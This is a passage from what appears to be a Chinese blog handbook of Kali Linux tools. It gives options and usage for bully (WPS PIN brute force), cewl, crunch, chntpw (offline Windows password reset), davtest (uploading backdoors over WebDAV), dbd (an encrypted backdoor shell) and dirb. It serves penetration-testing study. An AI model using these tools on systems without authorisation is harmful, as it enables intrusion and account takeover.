class="hljs-number">1</span>-<span class="hljs-number">4</span>，其中<span class="hljs-number">1</span>最简洁<span class="hljs-selector-attr">[3]</span><br><br>-w,<span class="hljs-attr">--workdir</span> path<br>pin/会话文件的位置<span class="hljs-selector-attr">[~/.bully/]</span><br><br>-<span class="hljs-number">5</span>,--<span class="hljs-number">5</span>ghz<br>跳到<span class="hljs-number">5</span>GHz <span class="hljs-selector-tag">a</span> / n默认频道列表<span class="hljs-selector-attr">[否]</span><br><br>-<span class="hljs-selector-tag">B</span>,<span class="hljs-attr">--bruteforce</span><br>WPS pin校验和数字<span class="hljs-selector-attr">[否]</span><br><br>-F,<span class="hljs-attr">--force</span><br>尽管发出警告，仍然继续强制进行<span class="hljs-selector-attr">[否]</span><br><br>-S,<span class="hljs-attr">--sequential</span><br>pin序列(不随机)<span class="hljs-selector-attr">[No]</span><br><br>-T,<span class="hljs-attr">--test</span><br>测试模式(不注入任何数据包)<span class="hljs-selector-attr">[否]</span><br></code></pre></td></tr></table></figure><h3 id="高级参数："><a href="#高级参数：" class="headerlink" title="高级参数："></a>高级参数：</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs css">-d,<span class="hljs-attr">--pixiewps</span><br>尝试使用pixiewps<span class="hljs-selector-attr">[否]</span><br><br>-<span class="hljs-selector-tag">a</span>,<span class="hljs-attr">--acktime</span> N<br>弃用/忽略<span class="hljs-selector-attr">[自动]</span><br><br>-r,<span class="hljs-attr">--retries</span> N<br>未确认时重新发送数据包N次<span class="hljs-selector-attr">[2]</span><br><br>-m,<span class="hljs-attr">--m13time</span> N<br>弃用/忽略<span class="hljs-selector-attr">[自动]</span><br><br>-t,<span class="hljs-attr">--timeout</span> N<br>弃用/忽略<span class="hljs-selector-attr">[自动]</span><br><br>-<span class="hljs-number">1</span>,<span class="hljs-attr">--pin1delay</span> M,N<br>在M5的第N个小节延迟M秒<span class="hljs-selector-attr">[0,1]</span><br><br>-<span class="hljs-number">2</span>,<span class="hljs-attr">--pin2delay</span> M,N<br>在M7的第N个小节延迟M秒<span class="hljs-selector-attr">[5,1]</span><br><br>-<span class="hljs-selector-tag">A</span>,<span class="hljs-attr">--noacks</span><br>对发送的数据包禁用ACK检查<span class="hljs-selector-attr">[否]</span><br><br>-C,<span class="hljs-attr">--nocheck</span><br>跳过CRC / FCS验证（性能）<span class="hljs-selector-attr">[否]</span><br><br>-D,<span class="hljs-attr">--detectlock</span><br>检测AP未报告的WPS锁定<span class="hljs-selector-attr">[否]</span><br><br>-E,<span class="hljs-attr">--eapfail</span><br>EAP失败会终止每次交换<span class="hljs-selector-attr">[否]</span><br><br>-L,<span class="hljs-attr">--lockignore</span><br>忽略AP报告的WPS锁<span class="hljs-selector-attr">[否]</span><br><br>-M,<span class="hljs-attr">--m57nack</span><br>作为WSC_NACK的M5/M7超时处理<span class="hljs-selector-attr">[否]</span><br><br>-N,<span class="hljs-attr">--nofcs</span><br>数据包不包含FCS字段<span class="hljs-selector-attr">[自动]</span><br><br>-<span class="hljs-selector-tag">P</span>,<span class="hljs-attr">--probe</span><br>对非信标AP使用探测请求<span class="hljs-selector-attr">[否]</span><br><br>-<span class="hljs-selector-tag">Q</span>,<span class="hljs-attr">--wpsinfo</span><br>使用探测请求收集WPS信息<span class="hljs-selector-attr">[否]</span><br><br>-R,<span class="hljs-attr">--radiotap</span><br>假设存在radiotap标头<span class="hljs-selector-attr">[自动]</span><br><br>-W,<span class="hljs-attr">--windows7</span><br>伪装成Windows <span class="hljs-number">7</span>注册商<span class="hljs-selector-attr">[否]</span><br><br>-Z,<span class="hljs-attr">--suppress</span><br>抑制数据包节流算法<span class="hljs-selector-attr">[否]</span><br><br>-V,<span class="hljs-attr">--version</span><br>打印版本信息<br><br>-h,<span class="hljs-attr">--help</span><br>打印帮助信息<br></code></pre></td></tr></table></figure><h2 id="burpsuite"><a href="#burpsuite" class="headerlink" title="burpsuite"></a>burpsuite</h2><p>不用讲了</p><h1 id="C"><a href="#C" class="headerlink" title="C"></a>C</h1><h2 id="cadaver"><a href="#cadaver" class="headerlink" title="cadaver"></a>cadaver</h2><h3 id="描述：-4"><a href="#描述：-4" class="headerlink" title="描述："></a><strong>描述：</strong></h3><p>cadaver是WEBDAV的 客户端</p><p>WebDAV协议允许用户通过HTTP保存和共享文件，这是一个非常有价值的突破，因为HTTP通常是只读的，除了访问文档外，用户可以编辑和重新上传它 们，你可以将其理解为一种基于HTTP的网络文件系统，或一种支持长距离文件协作的方法。WebDAV协议支持文件锁和版本控制，因此，当你访问到 WebDAV文件夹后，你就可以编辑文件，不用担心会覆盖其他人的编辑成果。时至今日，虽然在线协作的方法越来越多，但WebDAV在文件共享方面仍然有 它的用处，特别是有很多的服务器和客户端软件支持它。</p><p>adaver支持文件上载，下载，屏幕显示，名称空间操作（移动和复制），集合创建和删除以及锁定操作，其操作类似于标准BSD ftp（1）客户端和Samba项目的smbclient（1）。 熟悉这些工具的用户应该会对cadaver相当熟悉。<br> cadaver支持通过.netrc文件自动登录到需要身份验证的服务器（类似于ftp（1）</p><h3 id="选项：-1"><a href="#选项：-1" class="headerlink" title="选项："></a>选项：</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs stylus">-t,<span class="hljs-attr">--tolerant</span><br>允许cd / ope进入未启用WebDAV的集合； 如果服务器或代理服务器有WebDAV合规性问题，请使用。<br><br>-r,<span class="hljs-attr">--rcfile</span>=file<br>使用此rcfile而不是默认的〜/ <span class="hljs-selector-class">.cadaverrc</span><br><br>-<span class="hljs-selector-tag">p</span>,<span class="hljs-attr">--proxy</span>=host<span class="hljs-selector-attr">[:port]</span><br>使用代理主机“host”和可选代理端口“port”连接。<br><br>-V,<span class="hljs-attr">--version</span><br>显示版本信息<br><br>-h,<span class="hljs-attr">--help</span><br>显示帮助信息<br></code></pre></td></tr></table></figure><h3 id="netrc文件"><a href="#netrc文件" class="headerlink" title=". netrc文件"></a><strong>. netrc文件</strong></h3><p>文件~&#x2F;.netrc可用于自动登录到需要身份验证的服务器。可以使用以下标记(用空格、制表符或换行符分隔):<br>   机器主机<br>     标识一个远程计算机主机，它与命令行上给定的主机名相比较，或者作为打开命令的参数。直到文件末尾或下一个机器或默认令牌的任何后续令牌都与此条目相关联。<br>   默认<br>     这等效于机器令牌，但匹配任何主机名。 只能使用一个默认令牌，并且必须在所有机器令牌之后。<br>   登录用户名<br>     指定登录到远程计算机时使用的用户名<br>   密码<br>     指定登录到远程计算机时使用的密码。</p><h2 id="Catfish"><a href="#Catfish" class="headerlink" title="Catfish"></a>Catfish</h2><p>文件快速搜素工具，类似windows上的<code>Everything</code></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220406235429984.png" alt="image-20220406235429984"></p><h2 id="cewl"><a href="#cewl" class="headerlink" title="cewl"></a>cewl</h2><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220406235653400.png" alt="image-20220406235653400"></p><p>cewl通过爬行网站获取关键信息创建一个密码字典。</p><p>官网：<a href="http://digi.ninja/projects/cewl.php">http://digi.ninja/projects/cewl.php</a></p><h3 id="用法："><a href="#用法：" class="headerlink" title="用法："></a>用法：</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">cewl [OPTION] ... <span class="hljs-built_in">URL</span><br><br>cewl [选项] ... <span class="hljs-built_in">URL</span><br><br><span class="hljs-comment">--help，-h：显示帮助</span><br><br><span class="hljs-comment">--keep，-k：保留下载的文件</span><br><br><span class="hljs-comment">--depth x，-d x：深度到蜘蛛，默认2</span><br><br><span class="hljs-comment">--min_word_length，-m：最小字长，默认为3</span><br><br><span class="hljs-comment">--offsite，-o：让蜘蛛访问其他网站</span><br><br><span class="hljs-comment">--write，-w file：将输出写入文件</span><br><br><span class="hljs-comment">--ua，-u user-agent：用户代理发送</span><br><br><span class="hljs-comment">--no-words，-n：不输出单词表</span><br><br><span class="hljs-comment">--meta， -a 包含元数据</span><br><br><span class="hljs-comment">--meta_file file：元数据的输出文件</span><br><br><span class="hljs-comment">--email，-e包括电子邮件地址</span><br><br><span class="hljs-comment">--email_file file：电子邮件地址的输出文件</span><br><br><span class="hljs-comment">--meta-temp-dir directory：exiftool在解析文件时使用的临时目录，默认为/ tmp</span><br><br><span class="hljs-comment">--count，-c：显示找到的每个单词的计数</span><br><br>认证<br><br><span class="hljs-comment">--auth_type：摘要或基本</span><br><br><span class="hljs-comment">--auth_user：认证用户名</span><br><br><span class="hljs-comment">--auth_pass：认证密码</span><br><br>代理支持<br><br><span class="hljs-comment">--proxy_host：代理主机</span><br><br><span class="hljs-comment">--proxy_port：代理端口，默认8080</span><br><br><span class="hljs-comment">--proxy_username：代理的用户名，如果需要的话</span><br><br><span class="hljs-comment">--proxy_password：代理的密码（如果需要）</span><br><br>Headers头<br><br><span class="hljs-comment">--header, -H: 格式名称：值 - 可以传递多个</span><br><br><span class="hljs-comment">--verbose, -v: 详细</span><br><br><span class="hljs-built_in">URL</span>: 蜘蛛网站。<br></code></pre></td></tr></table></figure><h3 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h3><p>cewl -v <a href="http://www.fujieace.com/">www.fujieace.com</a></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220406235933063.png" alt="image-20220406235933063"></p><p>cewl 1.1.1.1 -m 3 -d 3 -e -c -v -w a.txt  （1.1.1.1可以是目标网站的ip地址，也可以是网址）</p><p>-m:最小单词长度<br>-d:爬网深度<br>-e:收集包含emali地址信息<br>-c:每个单词出现的次数<br>支持基本，摘要，身份验证</p><p>更多详细用法:</p><p><a href="https://www.ddosi.org/cewl/">https://www.ddosi.org/cewl/</a></p><h2 id="cherryTree"><a href="#cherryTree" class="headerlink" title="cherryTree"></a>cherryTree</h2><p>一个富文本软件</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411130327239.png" alt="image-20220411130327239"></p><h2 id="chntpw"><a href="#chntpw" class="headerlink" title="chntpw"></a>chntpw</h2><p>这个在实战中只能用于物理攻击</p><p>或者针对window虚拟机(因为虚拟机可以开启虚拟映像)</p><h3 id="描述：-5"><a href="#描述：-5" class="headerlink" title="描述："></a>描述：</h3><p>覆盖Windows系统密码的实用程序。<br>  chntpw是一个实用程序，用于查看一些信息并重置Microsoft Windows操作系统（在NT3.x和更高版本中）使用的Windows NT &#x2F; 2000 SAM用户数据库文件中的用户密码。 该文件通常位于Windows文件系统上的\ WINDOWS \ system32 \ config \ SAM中。 无需知道先前的密码即可重置它们。 此外，它还包含一个简单的注册表编辑器和ahex编辑器，可以使用它浏览和修改注册表文件中包含的信息。<br>  该程序应该能够处理32位和64位Microsoft Windows以及从NT3.x到Win8.1的所有版本。</p><h3 id="选项：-2"><a href="#选项：-2" class="headerlink" title="选项："></a>选项：</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs markdown">-h<br><span class="hljs-code">显示选项的摘要信息。</span><br><span class="hljs-code"></span><br>-u username<br><span class="hljs-code">要更改的用户名或用户名ID（RID）。 默认值为“Administrator”。</span><br><span class="hljs-code"></span><br>-l<br><span class="hljs-code">列出SAM数据库中的所有用户，然后退出。</span><br><span class="hljs-code"></span><br>-i<br><span class="hljs-code">交互菜单系统:列出所有用户(按-l选项)，然后要求用户更改。</span><br><span class="hljs-code"></span><br>-e<br><span class="hljs-code">功能有限的注册表编辑器(但它确实包括写支持)。有关更强大的编辑器，请参阅reged</span><br><span class="hljs-code"></span><br>-d<br><span class="hljs-code">使用缓冲调试器代替(十六进制编辑器)</span><br><span class="hljs-code"></span><br>-L<br><span class="hljs-code">将所有更改的文件名记录到/ tmp / changed。 设置此选项后，程序将自动将更改保存在配置单元文件中，而不会提示用户。 在多用户系统中将-L选项作为root用户使用时要小心。 文件名是固定的，恶意用户可以使用它（删除具有相同名称的符号链接）来覆盖系统文件。</span><br><span class="hljs-code"></span><br>-N<br><span class="hljs-code">不要分配更多信息，仅允许编辑相同大小的现有值。</span><br><span class="hljs-code"></span><br>-E<br><span class="hljs-code">不要展开配置单元文件（安全模式）。</span><br><span class="hljs-code"></span><br>-v<br><span class="hljs-code">打印详细信息和调试消息。</span><br><span class="hljs-code"></span><br></code></pre></td></tr></table></figure><p>操作的工具需要一个kaili live系统，将目标机器设为USB启动，这样就可以通过USB在目标机器上启动kali了。</p><p>进入Kali后，将挂载包含Windows文件夹的硬盘，进入到SAM的目录下，再使用chntpw工具清空密码信息，最后退出系统弹出U盘并启动目标系统，就可以空密码登陆系统了。<br><strong>命令演示：</strong></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411130940937.png" alt="image-20220411130940937"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411131429585.png" alt="image-20220411131429585"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411131444017.png" alt="image-20220411131444017"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411131457485.png" alt="image-20220411131457485"></p><p>可以直接回车使用默认选择的用户也可以输入用户的RID指定用户</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411131522202.png" alt="image-20220411131522202"></p><p>选择1后，显示Password cleared！</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411131546814.png" alt="image-20220411131546814"></p><p>参考::<a href="https://blog.csdn.net/Vincent_zhang1949/article/details/105046599?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_antiscanv2&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_antiscanv2&utm_relevant_index=1">https://blog.csdn.net/Vincent_zhang1949/article/details/105046599?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1.pc_relevant_antiscanv2&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1.pc_relevant_antiscanv2&amp;utm_relevant_index=1</a></p><h2 id="clang"><a href="#clang" class="headerlink" title="clang"></a>clang</h2><p>clang-Clang C，C ++和Objective-C编译器。</p><p>clang是一个C、c++和Objective-C编译器，它包含预处理、解析、优化、代码生成、汇编和链接。根据传递的高级模式设置，Clang会在完成完整链接之前停止。尽管Clang是高度集成的，但重要的是了解编译的阶段，了解如何调用它。</p><p>指令好多:<br>详情参考<a href="https://blog.csdn.net/qq_40399982/article/details/112379293">https://blog.csdn.net/qq_40399982/article/details/112379293</a></p><p>爱奇艺教程:</p><p><a href="https://www.iqiyi.com/w_19rutgeipt.html">https://www.iqiyi.com/w_19rutgeipt.html</a></p><h2 id="clang-1"><a href="#clang-1" class="headerlink" title="clang++"></a>clang++</h2><p>clang++是一款LLVM编译器；跟linux下的gcc、gc++编译器差不多。</p><p>它是<a href="https://www.fujieace.com/kali-linux/courses/clang.html">clang</a>的另一个升级版本，使用方法其实都是一样的。同理于c语言和c++；</p><p>clang就好比gcc编译器；</p><p>clang++就好比gc++编译器；</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411132044495.png" alt="image-20220411132044495"></p><h2 id="Clipboard-Manager-Settings"><a href="#Clipboard-Manager-Settings" class="headerlink" title="Clipboard Manager Settings"></a>Clipboard Manager Settings</h2><p>剪贴板配置管理器</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411132528127.png" alt="image-20220411132528127"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411132536123.png" alt="image-20220411132536123"></p><h2 id="commix"><a href="#commix" class="headerlink" title="commix"></a>commix</h2><p>这个工具已经失效了 kali上好多工具都失效了</p><h2 id="crunch"><a href="#crunch" class="headerlink" title="crunch"></a>crunch</h2><p>字典生成工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">crunch 6 8<br>//生成6到8位字典<br><br>crunch 6 8 1234567890 -o /root/num.list<br>//生成6到8位字典，参数为1234567890，-o 输出文件位置与名字<br><br>crunch 10 10 -t @@@@@@1219 -o/root/num.list<br>//-t 猜测部分，@表示未知参数<br><br>crunch 10 10 -f /usr/share/rainbowcrack/charset.txt mixalpha -o /root/num.list<br>// -f 指定字符集文件 使用mixalpha字符集<br><br>crunch 5 5 -t 2018%<br>生成以2018开头的5位纯数字密码<br><br>crunch 5 5 -p zhangsan lisi wangwu 123 456 789<br>生成zhangsan 、lisi、wangwu、123、456、789这个几个词组的组合，组合最大为5<br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411133747547.png" alt="image-20220411133747547"></p><h2 id="cutcapt"><a href="#cutcapt" class="headerlink" title="cutcapt"></a>cutcapt</h2><p>网站截图工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cutycapt --url=http://www.baidu.com/ --out=baidu.png               <br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411135558468.png" alt="image-20220411135558468"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411135658970.png" alt="image-20220411135658970"></p><h1 id="D"><a href="#D" class="headerlink" title="D"></a>D</h1><h2 id="davtest"><a href="#davtest" class="headerlink" title="davtest"></a>davtest</h2><p>WebDAV是基于Web服务的扩展服务。它允许用户像操作本地文件一样，操作服务器上的文件。借助该功能，用户很方便的在网络上存储自己的文件。为了方便用户使用，通常会提供给用户较大的文件权限，如上传、修改甚至是执行权限。Kali Linux提供了一款WebDAV服务漏洞利用工具DAVTest。该工具会自动检测权限，寻找可执行文件的权限。一旦发现，用户就可以上传内置的后门工具，对服务器进行控制。同时，该工具可以上传用户指定的文件，便于后期利用。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">-auth+<br>授权(用户:密码)<br><br>-cleanup<br>完成后删除所有上传的内容<br><br>-directory+<br>要创建的目录的后缀部分<br><br>-debug+<br>DAV调试级别1-3（将2和3日志请求/响应复制到/tmp/perldav_debug.txt）<br><br>-move<br>放置文本文件，然后移动到可执行文件<br><br>-nocreate<br>不要创建目录<br><br>-quiet<br>仅打印摘要<br><br>-rand+<br>使用它代替文件名的随机字符串<br><br>-sendbd+<br>发送后门:<br>自动-用于任何成功的测试<br>ext-后门/目录中与文件名匹配的扩展名<br><br>-uploadfile+<br>上传此文件（需要-uploadloc）<br><br>-uploadloc+<br>将文件上传到此位置/名称（需要-uploadfile）<br><br>-url+<br>DAV位置的url<br></code></pre></td></tr></table></figure><p>在服务器上利用WebDAV并获取Shell</p><p><a href="https://www.myncic.com/archives/5570">https://www.myncic.com/archives/5570</a></p><h2 id="DB-Browser-for-SQLite"><a href="#DB-Browser-for-SQLite" class="headerlink" title="DB Browser for SQLite"></a>DB Browser for SQLite</h2><p><strong>DB Browser for SQLite</strong>是一款开源的的sqlite数据库编辑器，在这里你既能创建一个新的数据库，也能打开已有的sqlite数据库进行编辑和查看，它最大的特点就是采用表格的创建和编辑方式，即便是您没有学习过SQL语句，也能使用该工具进行数据库创建和编辑的操作。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411140109938.png" alt="image-20220411140109938"></p><h2 id="dbd"><a href="#dbd" class="headerlink" title="dbd"></a>dbd</h2><p>dbd功能类似于Netcat，但提供强大的加密功能，支持AES-CBC-128和HMAC-SHA1加密。该工具可以运行在类Unix和Windows系统中。渗透测试人员首先使用该工具在目标主机建立监听，构建后门。然后，再在攻击机使用该工具连接目标主机，执行Shell命令，从而达到控制目标主机的功能。为了安全，用户可以指定数据传输所使用的密钥，避免数据被窃听。除了作为后门工具，该工具还可以用于点对点的通信功能，如聊天等。<br>  这个程序是自由软件;您可以在自由软件基金会发布的GNU通用公共授权条款下重新发布和&#x2F;或修改它;许可证的版本2，或者(根据您的选择)任何更新的版本。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs bash">-l<br>监听传入的连接<br><br>-p n<br>选择要侦听的端口，或选择要从其连接的源端口<br><br>-a address<br>选择一个地址以收听或连接<br><br>-e prog<br>连接后要执行的程序（例如-e cmd.exe或-e bash）<br><br>-r n<br>无限重生/重新连接，在两次连接尝试之间暂停n秒。 -r0可用于在断开连接后重新监听（就像常规守护程序一样）<br><br>-c on|off<br>开/关加密。 指定是否要使用内置的AES-CBC-128 + HMAC-SHA1加密实现（由Christophe Devine-http://www.cr0.net:8040/）或默认不使用：-c on<br><br>-k secret<br>覆盖用于加密的默认短语（秘密必须在客户端和服务器之间共享）<br><br>-q<br>安静，安静，不打印任何内容（覆盖-v）<br><br>-v<br>详细的<br><br>-n<br>切换仅数字的IP地址（不进行DNS解析）。 如果您两次指定-n，则原始状态将处于活动状态（即-n就像打开/关闭开关一样）<br><br>-m<br>打开/关闭切换监视（监听）（仅与-e选项一起使用）。 还可以通过指定-vv（两次-v）来打开监听<br><br>-P profix<br>为所有出站数据添加前缀（+硬编码分隔符）。此选项仅对“聊天模式”中的dbd有用（以昵称发送的前缀行）<br><br>-H on|off<br>用硬编码（彩色）转义序列突出显示传入的数据（例如，聊天）。 默认为：-H off<br><br>-V<br>打印版本标语并退出（在错误报告中包括该输出，并将错误报告发送至michel.blomgren@tigerteam.se）<br><br></code></pre></td></tr></table></figure><p><strong>类unix操作系统的特定选项:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">-s<br>调用shell，仅此而已。 如果dbd是setuid 0，它将调用一个根shell<br><br>-w n<br>空闲的读/写操作和程序执行的“固定超时”（以秒为单位）（-e选项）<br><br>-D on|off<br>分叉并在后台运行（守护进程）。 默认值：-D off<br><br></code></pre></td></tr></table></figure><p>Dbd 也仅仅只支持 TCP&#x2F;IP 连接</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411142114940.png" alt="image-20220411142114940"></p><h2 id="dirb"><a href="#dirb" class="headerlink" title="dirb"></a>dirb</h2><p>目录扫描软件</p><p>dirb是一个基于字典的web目录扫描工具，会用递归的方式来获取更多的目录，它还支持代理和http认证限制访问的网站</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">格式：dirb &lt;url_base&gt; [&lt;wordlist_file(s)&gt;] [options]<br><br>-a 设置user-agent<br><br>-p &lt;proxy[:port]&gt;设置代理<br><br>-c 设置cookie<br><br>-z 添加毫秒延迟，避免洪水攻击<br><br>-o 输出结果<br><br>-X 在每个字典的后面添加一个后缀<br><br>-H 添加请求头<br><br>-i 不区分大小写搜索<br><br></code></pre></td></tr></table></figure><p>1.使用&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;big.txt 字典来扫描Web服务</p><p>dirb <a href="http://192.168.1.116/">http://192.168.1.116</a> 